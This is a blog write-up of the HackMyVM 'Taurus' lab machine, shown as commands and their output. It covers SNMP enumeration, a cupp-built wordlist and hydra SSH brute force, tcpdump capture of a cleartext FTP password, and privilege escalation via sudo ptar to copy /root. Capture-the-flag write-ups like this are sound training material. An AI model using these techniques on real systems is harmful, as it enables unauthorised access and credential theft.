---
layout: post
title: "HackMyVM - Taurus"
date: 2021-10-18 15:47:00 +0100
categories: hmv
---

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Medium
Release Date: 2021-10-18

## Scan & Enumeration

```bash
$ sudo nmap -sT -sU -oA nmap/taurus 192.168.1.22
Starting Nmap 7.93 ( https://nmap.org ) at 2021-10-18 18:03 WET
Nmap scan report for 192.168.1.22
Host is up (0.00040s latency).
Not shown: 998 closed udp ports (port-unreach), 998 closed tcp ports (conn-refused)
PORT    STATE         SERVICE
21/tcp  filtered      ftp
22/tcp  open          ssh
68/udp  open|filtered dhcpc
161/udp open          snmp
MAC Address: 08:00:27:DD:9C:96 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1010.18 seconds
```

### SNMP

```bash
$ snmp-check 192.168.1.22
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.1.22:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.1.22
  Hostname                      : "I Love My Name, Don't You, Little Hackers ?"
  Description                   : Linux taurus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
  Contact                       : Sarah <sarah@hmv.org>
  Location                      : Unknown
  Uptime snmp                   : 00:25:06.82
  Uptime system                 : 00:25:02.08
  System date                   : 2021-10-18 19:09:17.0
```

## Cracking

```bash
$ python3 cupp.py -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: sarah
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: 
> Do you want to add special chars at the end of words? Y/[N]: 
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]: 

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to sarah.txt, counting 252 words.
> Hyperspeed Print? (Y/n) : n
[+] Now load your pistolero with sarah.txt and shoot! Good luck!
```

```bash
$ hydra -t64 -T64 -V ssh://192.168.1.22 -l sarah -P sarah.txt
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-18 19:03:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 252 login tries (l:1/p:252), ~4 tries per task
[DATA] attacking ssh://192.168.1.22:22/
....
....
[22][ssh] host: 192.168.1.22   login: sarah   password: Sarah_2012
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-18 19:04:34
```

## SSH (sarah)

```bash
$ ssh sarah@192.168.1.22                                       
Linux taurus 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
Last login: Sat Oct 16 21:19:01 2021 from 192.168.0.28
sarah@taurus:~$ 
```

## TCPDump (marion)

* Console 1

```bash
sarah@taurus:~$ sudo -u marion /usr/bin/bash /opt/ftp
ftp connection opened.
ftp connection closed.
sarah@taurus:~$ 
```

* Console 2

```bash
sarah@taurus:~$ tcpdump -A -s 10240 -i lo
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on lo, link-type EN10MB (Ethernet), snapshot length 10240 bytes
20:12:56.487464 IP6 localhost.34574 > localhost.ftp: Flags [S], seq 2983640299, win 65476, options [mss 65476,sackOK,TS val 2475588598 ecr 0,nop,wscale 7], length 0
`..M.(.@.................................................0.........
..{.........
20:12:56.487493 IP6 localhost.ftp > localhost.34574: Flags [S.], seq 352611006, ack 2983640300, win 65464, options [mss 65476,sackOK,TS val 2475588598 ecr 2475588598,nop,wscale 7], length 0
`.>..(.@......................................j..........0.........
..{...{.....
20:12:56.487520 IP6 localhost.34574 > localhost.ftp: Flags [.], ack 1, win 512, options [nop,nop,TS val 2475588598 ecr 2475588598], length 0
`..M. .@..........................................j......(.....
..{...{.
20:12:56.491689 IP6 localhost.ftp > localhost.34574: Flags [P.], seq 1:36, ack 1, win 512, options [nop,nop,TS val 2475588602 ecr 2475588598], length 35: FTP: 220 ProFTPD Server (Debian) [::1]
`.>..C.@......................................j..........K.....
..{...{.220 ProFTPD Server (Debian) [::1]

20:12:56.491719 IP6 localhost.34574 > localhost.ftp: Flags [.], ack 36, win 512, options [nop,nop,TS val 2475588602 ecr 2475588602], length 0
`..M. .@..........................................j......(.....
..{...{.
20:12:56.491866 IP6 localhost.34574 > localhost.ftp: Flags [P.], seq 1:14, ack 36, win 512, options [nop,nop,TS val 2475588603 ecr 2475588602], length 13: FTP: USER marion
`..M.-.@..........................................j......5.....
..{...{.USER marion

20:12:56.491902 IP6 localhost.ftp > localhost.34574: Flags [.], ack 14, win 512, options [nop,nop,TS val 2475588603 ecr 2475588603], length 0
`.>.. .@......................................j..........(.....
..{...{.
20:12:56.492324 IP6 localhost.ftp > localhost.34574: Flags [P.], seq 36:70, ack 14, win 512, options [nop,nop,TS val 2475588603 ecr 2475588603], length 34: FTP: 331 Password required for marion
`.>..B.@......................................j..........J.....
..{...{.331 Password required for marion

20:12:56.492342 IP6 localhost.34574 > localhost.ftp: Flags [.], ack 70, win 512, options [nop,nop,TS val 2475588603 ecr 2475588603], length 0
`..M. .@..........................................k......(.....
..{...{.
20:12:56.492393 IP6 localhost.34574 > localhost.ftp: Flags [P.], seq 14:32, ack 70, win 512, options [nop,nop,TS val 2475588603 ecr 2475588603], length 18: FTP: PASS ilovesushis
`..M.2.@..........................................k......:.....
..{...{.PASS ilovesushis

20:12:56.492423 IP6 localhost.ftp > localhost.34574: Flags [.], ack 32, win 512, options [nop,nop,TS val 2475588603 ecr 2475588603], length 0
`.>.. .@......................................k..........(.....
..{...{.
20:12:56.560359 IP6 localhost.ftp > localhost.34574: Flags [P.], seq 70:97, ack 32, win 512, options [nop,nop,TS val 2475588671 ecr 2475588603], length 27: FTP: 230 User marion logged in
`.>..;.@......................................k..........C.....
..|?..{.230 User marion logged in

20:12:56.560379 IP6 localhost.34574 > localhost.ftp: Flags [.], ack 97, win 512, options [nop,nop,TS val 2475588671 ecr 2475588671], length 0
`..M. .@..........................................k......(.....
..|?..|?
20:12:56.560441 IP6 localhost.34574 > localhost.ftp: Flags [P.], seq 32:38, ack 97, win 512, options [nop,nop,TS val 2475588671 ecr 2475588671], length 6: FTP: QUIT
`..M.&.@..........................................k............
..|?..|?QUIT

20:12:56.560465 IP6 localhost.ftp > localhost.34574: Flags [.], ack 38, win 512, options [nop,nop,TS val 2475588671 ecr 2475588671], length 0
`.>.. .@......................................k..........(.....
..|?..|?
20:12:56.560610 IP6 localhost.ftp > localhost.34574: Flags [P.], seq 97:111, ack 38, win 512, options [nop,nop,TS val 2475588671 ecr 2475588671], length 14: FTP: 221 Goodbye.
`.>....@......................................k..........6.....
..|?..|?221 Goodbye.

20:12:56.560625 IP6 localhost.34574 > localhost.ftp: Flags [.], ack 111, win 512, options [nop,nop,TS val 2475588671 ecr 2475588671], length 0
`..M. .@..........................................k-.....(.....
..|?..|?
20:12:56.560818 IP6 localhost.34574 > localhost.ftp: Flags [F.], seq 38, ack 111, win 512, options [nop,nop,TS val 2475588672 ecr 2475588671], length 0
`..M. .@..........................................k-.....(.....
..|@..|?
20:12:56.563861 IP6 localhost.ftp > localhost.34574: Flags [F.], seq 111, ack 39, win 512, options [nop,nop,TS val 2475588675 ecr 2475588672], length 0
`.>.. .@......................................k-.........(.....
..|C..|@
20:12:56.563885 IP6 localhost.34574 > localhost.ftp: Flags [.], ack 112, win 512, options [nop,nop,TS val 2475588675 ecr 2475588675], length 0
`..M. .@..........................................k......(.....
..|C..|C
20:12:56.564087 IP localhost.56230 > localhost.domain: 16546+ A? localhost. (27)
E..7GA@.@..r...........5.#.6@...........        localhost.....
20:12:56.564100 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S!..........).....E..7GA@.@..r...........5.#.6@...........    localhost.....
20:12:56.564113 IP localhost.56230 > localhost.domain: 44710+ AAAA? localhost. (27)
E..7GB@.@..q...........5.#.6............        localhost.....
20:12:56.564119 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S ................E..7GB@.@..q...........5.#.6............    localhost.....
20:12:56.564145 IP localhost.51322 > localhost.domain: 16546+ A? localhost. (27)
E..7GC@.@..p.........z.5.#.6@...........        localhost.....
20:12:56.564151 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S...........<0....E..7GC@.@..p.........z.5.#.6@...........    localhost.....
20:12:56.564160 IP localhost.51322 > localhost.domain: 44710+ AAAA? localhost. (27)
E..7GD@.@..o.........z.5.#.6............        localhost.....
20:12:56.564165 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S............+....E..7GD@.@..o.........z.5.#.6............    localhost.....
20:12:56.564896 IP localhost.37960 > localhost.domain: 42700+ A? localhost. (27)
E..7GE@.@..n.........H.5.#.6............        localhost.....
20:12:56.564905 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S...........
8....E..7GE@.@..n.........H.5.#.6............   localhost.....
20:12:56.564916 IP localhost.37960 > localhost.domain: 51658+ AAAA? localhost. (27)
E..7GF@.@..m.........H.5.#.6............        localhost.....
20:12:56.564920 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S............9....E..7GF@.@..m.........H.5.#.6............    localhost.....
20:12:56.564945 IP localhost.35391 > localhost.domain: 42700+ A? localhost. (27)
E..7GG@.@..l.........?.5.#.6............        localhost.....
20:12:56.564950 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S............A....E..7GG@.@..l.........?.5.#.6............    localhost.....
20:12:56.564959 IP localhost.35391 > localhost.domain: 51658+ AAAA? localhost. (27)
E..7GH@.@..k.........?.5.#.6............        localhost.....
20:12:56.564963 IP localhost > localhost: ICMP localhost udp port domain unreachable, length 63
E..S(...@.S............B....E..7GH@.@..k.........?.5.#.6............    localhost.....

```

## SSH (marion)

```bash
sarah@taurus:~$ su marion
Password: 
marion@taurus:/home/sarah$ cd
marion@taurus:~$ ls -la
total 32
drwx------ 4 marion marion 4096 Oct 16  2021 .
drwxr-xr-x 4 root   root   4096 Oct 16  2021 ..
lrwxrwxrwx 1 root   root      9 Oct 16  2021 .bash_history -> /dev/null
-rw-r--r-- 1 marion marion  220 Oct 16  2021 .bash_logout
-rw-r--r-- 1 marion marion 3526 Oct 16  2021 .bashrc
drwxr-xr-x 3 marion marion 4096 Oct 16  2021 .local
-rw-r--r-- 1 marion marion  807 Oct 16  2021 .profile
drwx------ 2 marion marion 4096 Oct 16  2021 .ssh
-rwx------ 1 root   root     33 Oct 16  2021 user.txt

marion@taurus:~/.ssh$ sudo -l
Matching Defaults entries for marion on taurus:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marion may run the following commands on taurus:
    (ALL : ALL) NOPASSWD: /usr/bin/ptar
marion@taurus:~/.ssh$ 

```

## Root - [ptar](https://gtfobins.github.io/gtfobins/tar/#sudo>)

```bash
marion@taurus:/tmp$ sudo /usr/bin/ptar -cf user.tar /home/marion
marion@taurus:/tmp$ sudo /usr/bin/ptar -cf root.tar /root
marion@taurus:/tmp$ ls -la
total 68
drwxrwxrwt  9 root root  4096 Dec 21 20:29 .
drwxr-xr-x 18 root root  4096 Oct 16  2021 ..
-rw-r--r--  1 root root 12800 Dec 21 20:29 root.tar
-rw-r--r--  1 root root 12800 Dec 21 20:29 user.tar

marion@taurus:/tmp$ tar -xf root.tar -C /tmp/
marion@taurus:/tmp$ tar -xf user.tar -C /tmp/

marion@taurus:/tmp$ ls -la
total 76
drwxrwxrwt 11 root   root    4096 Dec 21 20:31 .
drwxr-xr-x 18 root   root    4096 Oct 16  2021 ..
drwxr-xr-x  3 marion marion  4096 Dec 21 20:31 home
drwx------  4 marion marion  4096 Oct 16  2021 root
```